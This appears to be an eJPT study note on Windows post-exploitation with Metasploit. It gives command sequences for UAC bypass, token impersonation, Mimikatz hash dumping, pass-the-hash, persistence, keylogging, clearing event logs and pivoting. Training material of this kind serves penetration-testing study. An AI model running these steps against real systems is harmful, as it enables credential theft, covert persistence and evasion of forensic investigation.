# 36 Windows Post Exploitation

# Windows Post Exploitation Modules

-  The MSF provides us with a various post exploitation modules for both Windows and Linux
- We can utilize these post exploitation modules to enumerate information about the Windows system we currently have access to
	- Enumerate user privileges
	- Enumerate logged on users
	- VM check
	- Enumerate installed programs
	- Enumerate AVs
	- Enumerate computers connected to domain
	- Enumerate installed patches
	- Enumerate shares

### DEMO

```shell
meterpreter: getuid
meterpreter: getsystem # Attempt to elevate privilege
meterpreter: screenshot
meterpreter: hashdump
meterpreter: download
meterpreter: show_mount # Enum mount
meterpreter: ps # Show process
meterpreter: migrate <PID> or <name> # Migrate process (to x64?)
msf6: post(windows/manage/migrate) # Same to migrate in meterpreter 
msf6: post(windows/gather/win_privs) # Gather Privileges Enumeration
msf6: post(windows/gather/enum_logged_on_users) # Gather logged on user enum (registry)
msf6: post(windows/gather/checkvm) # Check if target is a VM
msf6: post(windows/gather/enum_av_excluded) # Antivirus Exclusions Enumeration
msf6: post(windows/gather/enum_computers) # On the same Active Directory
msf6: post(windows/gather/enum_patches)
msf6: post(windows/gather/enum_shares) 
msf6: post(windows/manage/enable_rdp) # Enables RDP (also view if it's already enabled)
msf6: loot # Show gathered information
```


# Windows Privilege Escalation: Bypassing UAC

- User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system
- UAC is used to ensure that changes to the operating system require approval from the administrator
- We can utilize the "Windows Escalate UAC Protection Bypass (In Memory Injection)" module to bypass UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off
- Need 64-bit Meterpreter Payload
- Access with a User in Administrators group

### DEMO

```shell
meterpreter: getprivs # Current (user) privileges 
meterpreter: shell
C:\Windows\system32> net users # Enum users
C:\Windows\system32> net localgroup Administrators # Enum users in Administrators group
msf6: exploit(windows/local/bypassuac_injection)
meterpreter: getsystem # Now we can becouse UAC is disabled
```


# Windows Privilege Escalation: Token Impersonation with Incognito

## Windows Access Tokens

- Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS)
- A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web coolie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token

- Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token
- An access token will typically be assigned one of the following security levels:
	- Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons
	- Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocol such as RDP

- Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token
- Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system

## Windows Privileges

- The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available

- The following are the privileges that are required for a successful impersonation attack:
	- SeAssignPrimaryToken: This allows a user to impersonate tokens
	- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges
	- SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges

## The Incognito module

- Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user token after successful exploitation
- We can use the incognito module to display a list of available tokens that we can impersonate 

### DEMO

```shell
meterpreter: getuid
meterpreter: getprivs # See if I have privs to token impersonation attack
meterpreter: load incognito # Load the extension
meterpreter: list_tokens -u # List token available
meterpreter: impersonate_token "<token-user-name>" # Impersonate
meterpreter: migrate # Migrate to another process if needed
```


# Dumping Hashes with Mimikatz

- Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy. It allows for the extraction of plaintext credentials from memory, password hashes from local SAM databases, and more
- The SAM (Security Account Manager) database, is a database file on Windows systems that stores users passwords and can be used to authenticate users both locally and remotely
- We can utilize the pre-built mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi
- Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk

### DEMO

```shell
# Need evelated privileges
meterpreter: load kiwi # Load the extension
meterpreter: help 
meterpreter: creds_all 
meterpreter: lsa_dump_sam # Dump SAM
meterpreter: lsa_dump_secrets

# If need to upload Mimikatz executable on target 
meterpreter: upload /usr/share/windows-resources/mimikatz/Win32
meterpreter: upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
meterpreter: shell # Spwn a shell
C:\Windows\system32>.\mimikatz.exe # Load the executable on the target 
mimikatz: sekurlsa::logonpasswords
mimikatz: lsadump::sam
```


# Pass-the-Hash with PSExec

- Pass-the hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately
- We can use the PsExec module to legitimately authenticate with the target system via SMB
- This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation

### DEMO

```shell
meterpreter: pgrep lsass
meterpreter: migrate <PID-lsass>
meterpreter: hashdump
# Save the hash in a file 
msf6: exploit(windows/smb/psexec)
msf6: set SMBUser <user>
msf6: set SMBPass <hash-or-clear>
```


# Establishing Persistence on Windows 

- Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access
- Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets
- We can utilize various post exploitation persistence modules to ensure that we always have access to the target system

### DEMO

```shell
# First get a privileg access, then:
meterpreter: exploit(windows/local/persistence_service)
meterpreter: set service_name <name> # Use one seems legit 
# Attention to lhost and lport when generating the payload

# Re-get access
msf6: exploit(multi/handler) # Remember the port set in payload
```


# Enabling RDP

- The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system
- RDP uses TCP port 3389 by default
- RDP is disabled by default, however, we can utilize an MSF exploit module to enable RDP on the Windows target and consequently utilize RDP to remotely access to the target system
- RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text

### DEMO

```shell
# First exploit, then
meterpreter: post(windows/manage/enable_rdp) # If want can create a new user
meterpreter: shell
C:\Windows\system32> net users # List users 
# Need user and password in clear-text 
# We can change administrator user, but not recommended
# Usually better create a new user account
C:\Windows\system32> net users Administrator <new-password> # Change the password 

# New shell tab, in Linux env
xfreerdp /u:<user> /p:<clear-password> /v:<target-ip>
```


# Windows Keylogging

- Keylogging is the process of recording or capturing the keystrokes entered on a target system
- This technique is not limited to post exploitation, there are plenty of programs and USB devices that can be used to capture and transmit the keystrokes entered on a system
- Meterpreter on a Windows system provides us with the ability to capture the keystrokes entered on a target system and download them back to our local system

### DEMO

```shell
meterpreter: pgrep explorer # Important to use this process
meterpreter: migrate <PID-explorer>
meterpreter: keyscan_dump
meterpreter: keyscan_start
meterpreter: keyscan_stop
```


# Clearing Windows Event Logs

- The Windows OS stores and catalogs all actions/events performed on the system and stores them in the Windows Event log
- Event logs are categorized based on the type of events they store
	- Application logs: Stores application/program events like startups, crashes etc.
	- System logs: Stores system events like startups, reboots etc.
	- Security logs: Stores security events like password changes, authentication failures etc.
- Event log can be accessed via the Event Viewer on Windows
- The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore very important to clear your tracks after you are done with your assessment

### DEMO

```shell
meterpreter: clearev 
```


# Pivoting

- Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host's private internal network
- After gaining access to one host, we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously
- Meterpreter provides us with the ability to add a network route to the internal network's subnet and consequently scan and exploit other systems on the network

### DEMO

```shell
# The route works only with module within msfconsole 
meterpreter: ipconfig # List interface available
meterpreter: run autoroute -s <ip-target1>/cidr # Add a route, use x.x.x.0/cidr
msf6: sessions -n <name> -i <Id> # Change name of a session
msf6: auxiliary(scanner/portscan/tcp) # Scan the added route
msf6: set rhosts <ip-target2> 
# Need to port forward
meterpreter: portfwd add -l <local-port> -p <port-to-fwd> -r <ip-target2>
# Now can use db_nmap
msf6: db_nmap -sS -sv -p <local-port> localhost

msf6: exploit(...)
msf6: set payload windows/meterpreter/bind_tcp
msf6: set rhosts <ip-target2>
msf6: set rport <port-target2>
msf6: set lport <local-port> # Non used port 
```

#eJPT #cybersecurity 